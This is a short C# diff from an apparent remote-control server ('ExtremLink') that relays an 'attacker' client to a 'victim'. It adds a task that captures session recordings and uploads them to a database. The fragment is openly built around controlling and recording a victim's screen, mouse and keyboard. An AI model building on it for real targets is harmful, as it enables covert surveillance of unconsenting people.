@@ -136,6 +136,7 @@ namespace ExtremLink_Server_v2.Classes
             await this.attacker.ConnectToClient();
             Log.LogInstance.AddMessage("👨‍💻 Attacker connected");
             Task.Run(() => this.HandleAttackerTcpCommunication());
+            Task.Run(() => this.HandleAttackerSessionTcpCommunication());
         }
         private async Task ConnectToVictim()
         {
@@ -179,7 +180,7 @@ namespace ExtremLink_Server_v2.Classes
             // & - Frames handling
             // % - Mouse handling
             // ^ - Keyboard handling
-            // $ - Sessions handling
+            // 📹🕑 - Sessions handling
             while (true)
             {
                 List<object> message = this.attacker.GetTCPMessageFromClient();
@@ -233,7 +234,8 @@ namespace ExtremLink_Server_v2.Classes
             // Output: The fucntion handle with session TCP packets which are sent by the attacker client.
             while (true)
             {
-                byte[] sessionByteArr = FromMP4ToByteArr();
+                
+                byte[] sessionByteArr = GetSession();
                 this.tempSession.VideoContent = sessionByteArr;
                 this.tempSession.UploadSessionToDatabase();
                 this.tempSession = null;
